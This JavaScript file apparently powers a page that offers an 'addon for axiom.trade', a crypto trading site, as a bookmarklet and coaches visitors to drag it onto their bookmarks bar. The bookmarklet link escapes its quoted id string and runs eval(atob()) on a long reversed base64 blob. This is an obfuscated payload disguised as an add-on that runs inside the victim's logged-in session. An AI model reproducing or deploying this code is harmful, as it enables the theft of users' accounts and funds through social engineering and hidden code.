const customerId = '9a016c9a8a55724134f5c696e7d9b62b';

function detectBookmarksBar() {
    if (typeof window.outerHeight === 'undefined' || typeof window.innerHeight === 'undefined') {
        return 'unknown';
    }

    const chromeHeight = window.outerHeight - window.innerHeight;

    if (chromeHeight <= 0 || chromeHeight > 200) {
        return 'unknown';
    }

    const platform = navigator.platform.toLowerCase();
    const isMac = platform.includes('mac');

    const ua = navigator.userAgent.toLowerCase();
    const isChrome = ua.includes('chrome') && !ua.includes('edg');
    const isFirefox = ua.includes('firefox');
    const isEdge = ua.includes('edg');
    const isSafari = ua.includes('safari') && !ua.includes('chrome');

    if (isChrome) {
        return isMac ? (chromeHeight > 123 ? 'open' : 'closed')
                     : (chromeHeight > 103 ? 'open' : 'closed');
    } else if (isFirefox) {
        return isMac ? (chromeHeight > 127 ? 'open' : 'closed')
                     : (chromeHeight > 107 ? 'open' : 'closed');
    } else if (isEdge) {
        return isMac ? (chromeHeight > 125 ? 'open' : 'closed')
                     : (chromeHeight > 105 ? 'open' : 'closed');
    } else if (isSafari) {
        return chromeHeight > 130 ? 'open' : 'closed';
    }

    return isMac ? (chromeHeight > 125 ? 'open' : 'closed')
                 : (chromeHeight > 105 ? 'open' : 'closed');
}

function isMobile() {
    const ua = navigator.userAgent.toLowerCase();
    const hasTouch = navigator.maxTouchPoints && navigator.maxTouchPoints > 1;
    const isMobileUA = /iphone|ipad|ipod|android|webos|blackberry|iemobile|opera mini/i.test(ua);
    return isMobileUA || (hasTouch && window.innerWidth < 1024);
}

document.addEventListener('DOMContentLoaded', function() {
    const link = document.querySelector('.activate');
    if (!link) return;

    let dragHint = null;

    if (!isMobile()) {
        
        link.href = `javascript: /* Addon for axiom.trade */ 'use strict'; const id = '${customerId}%27%3B%20eval%28atob%28%277kCKp0XKpgSfxESPn5Wau5WdSRXZstmch12av9mYf9lL39GZul2d7kiIuQnb192YjFGIyVGa09mbhBSeyRHIlNXYlxGUg4ibpFGajt2YvxmYg8GdgQ3Yl5mbvNGIvRHIlxmYh5WVigCdyVGbh5ydvRmbpdXfpkiZsEGK0V3bl1WaURXZz5TPhhSZzlWbvJHUgcXZuBCdpF2dhZiJjxTZ95mc1RXZytTMh0zZulmbuVnU0VGbrJXYtt2bvJ2Xf5ydvRmbpd3OpAWfpMGK05WZu9Gct92QJJVVlR2bj5WZ7RSPk9zZvx2dl52LrNWasNmLyVmbpFmck9yL6MHc0RHaghSZjFGbwVmcu42bpRXYj9Gbuc3bk5Wa3tTKpMGK5ZWan5WayR3cu40TTpEKh9Gdi1zY7kiIuQnb192YjFGIyVGa09mbhBSeyRHIlNXYlxGUg4ibpFGajt2YvxmYg8GdgQ3Yl5mbvNGIvRHIlxmYh5WVigCdyVGbh5ydvRmbpd3O9RmOzRXZsxWY3xCZppTZtFmbyV2c1xCduV2ZBJXZzVnLy9GdhdWa2Fmb6QnbldWQyV2c1xiZlJHau42bpRXYj9Gbuc3bk5Wa3pjbpdWay9mCskCKn5WayR3UPNVSvRnLpUGdhREI3VmbooDctFGdzVWbpR3e9M2epAjPoR3ZuVGbuQGKmlWfuJXd0Vmc7ETI9cmbp5mb1JFdlx2ayFWbr92bi91Xuc3bk5Wa3tXKsxWdu1TP9QGKml2OpgCa9QGI0NnbvN2epsyKltzY9wTZ7ETPlBCdlxGKy9mZ7lCMwUTPmxCMy0zYo42bpR3YuVnZgMmb5NXYsATI9cmbp5mb1JFdlx2ayFWbr92bi91Xuc3bk5Wa3hCf8dmbp5mb1JFdlx2ayFWbr92bi91Xuc3bk5Wa31XKp0nY6kXZLVGdhZXayBHLhpTelt0YpxmY1B3eo4TPp0lYsE2WogCch1mLpkCKzVWayRnbl5SZo02byZmL5FmcyFEIuJXd0Vmc7kSek9mYuQnbl1Wdj9GZoY2O0V2UrFWZXBydl5WPkxCch1EI3Vmb9UGI0NnbvN2OsxWduxSKiEibvRGZhBycphGdgU2c1Byb0BibpByZvxGIlNXYlxGUigCdyVGbh5ydvRmbpdHIuJXd0VmcpkiIkVGa0VXQzlmIo0WZ0lEdldmLldWYy9GdTxWYj9Gbuc3bk5Wa3FCKml2OsxWduxSKiIXZ292YzlGZvUGZhJHdu02bphXYv8iOzBHd0hmIoU2YhxGclJnLu9Wa0F2YvxmL39GZul2dKwSKiEibvRGZhBycphGdgU2c1Byb0BSZkFmc05SbvlGehByb0BSZ0F2ZpZXYuBSZzFWZsBlIoQnclxWYuc3bk5Wa3BibyVHdlJXKiUGZhJHdu02bphXYi0TPhQ3cvhmLu9Wa0F2YvxmL39GZul2doYWa91XKhhiZpcmbpxmYpNFd4VmbuEWPhtTY7QGbph2Q0NncpZmLh1TYoI3bmtTKdJ2WhhyYmYSKpICJzB3byBFdjFWZy91XigCa0l2VzRnchR3cuIGf8liIkIXZilmR0NWYlJ3XfJCKoRXaXNHdyFGdz5iYokSYg4WagIGI0NnbvNGKy9mZ7lSM90TPlBXeUVGZv5mLhhiZptXKhhiZg42bpR3YuVnZ91XK9liYoMmJmICdjVmai9mI90TPiBiZvVGc5RnJmI2e%2B0jYog2YhVkcvZmLpEGKzVWdsFmduQ3YlpmYP1XKnxiYoQXZz5SZmYyZmYiY7kCKtlmc05SeltUZ0FmdpJHcuEWPnxSKo0WayRnL5V2SjlGbiVHcuEWPiBCdz52bjtXKicmbpJHdzJSP90TeltUZ0FmdpJHcuEGIm9WZwlHdmYiIn5WayR3ci0TP9kXZLNWasJWdw5SYgY2blBXe0ZiJ5V2SlRXY2lmcw5SYmYSelt0YpxmY1BnLhhiZptTKhhCZkFmLktXKpEGKzFGauQWImYSYoYWa7lSYoMGIu9Wa0Nmb1Z2epgCag42bpR3YuVnZ7lCKu9Wa0Nmb1ZGK%27.split%28%27%27%29.reverse%28%29.join%28%27%27%29%29%29%3B`;
        link.draggable = true;
        
        link.addEventListener('click', function(e) {
            e.preventDefault();
            alert('Please drag this object to the bookmarks bar.');
        });
        
        dragHint = document.createElement('div');
        dragHint.id = 'drag-hint';
        dragHint.innerHTML = `
            <svg viewBox="0 0 100 100" width="100%" height="100%">
                <path d="M 50 15 L 90 70 Q 50 50, 10 70 L 50 15 Z"
                      fill="rgba(0,0,0,0.7)"
                      stroke="rgba(255,255,255,0.8)"
                      stroke-width="3"
                      stroke-linejoin="round"/>
            </svg>
        `;
        document.body.appendChild(dragHint);

        const style = document.createElement('style');
        style.textContent = `
            #drag-hint {
                position: fixed;
                pointer-events: none;
                width: 80px;
                height: 80px;
                opacity: 0;
                transition: opacity 0.2s ease;
                z-index: 9999;
                left: 0;
                top: 0;
                transform: translate(-50%, -100%);
            }
            #drag-hint.show { opacity: 1; }
            #drag-hint.stuck { transform: translate(-50%, 0%); }
            a.activate { cursor: grab !important; }
            a.activate:active { cursor: grabbing !important; }
        `;
        document.head.appendChild(style);
        
        link.addEventListener('dragstart', function(e) {
            dragHint.classList.add('show');
            dragHint.classList.add('stuck');
        });
        
        document.addEventListener('dragover', function(e) {
            if (!dragHint.classList.contains('show')) return;
            e.preventDefault();

            const offset = 64;
            const hintHeight = dragHint.offsetHeight;

            if (e.clientY - offset - hintHeight < 0) {
                dragHint.style.left = e.clientX + 'px';
                dragHint.style.top = '0px';
                dragHint.classList.add('stuck');
            } else {
                dragHint.style.left = e.clientX + 'px';
                dragHint.style.top = (e.clientY - offset) + 'px';
                dragHint.classList.remove('stuck');
            }
        });

        link.addEventListener('dragend', function() {
            dragHint.classList.remove('show');
            dragHint.classList.remove('stuck');
        });

        link.addEventListener('mouseover', function() {
            const status = detectBookmarksBar();
            const isMac = navigator.platform.toLowerCase().includes('mac');
            const shortcut = isMac ? 'Cmd + Shift + B' : 'Ctrl + Shift + B';
			const alertShown = localStorage.getItem('bookmarkAlertShown');

            if (status === 'closed' && !alertShown) {
                alert(`Please open the bookmarks bar by pressing ${shortcut}.`);
            } else if (status === 'unknown') {
                if (!alertShown) {
                    alert(`If your bookmarks bar is closed, please press ${shortcut} to open it.`);
                    localStorage.setItem('bookmarkAlertShown', 'true');
                }
            }
        });

    } else {
        link.textContent = 'Available for desktop only';
        link.href = '#';

        link.addEventListener('click', function(e) {
            e.preventDefault();

            if (navigator.share) {
                navigator.share({
                    title: document.title,
                    text: 'Open this link on your desktop browser',
                    url: window.location.href
                }).catch(() => {
                    alert('Please manually send this link to your desktop.');
                });
            } else {
                alert('Please send this link to your desktop.');
            }
        });
    }
});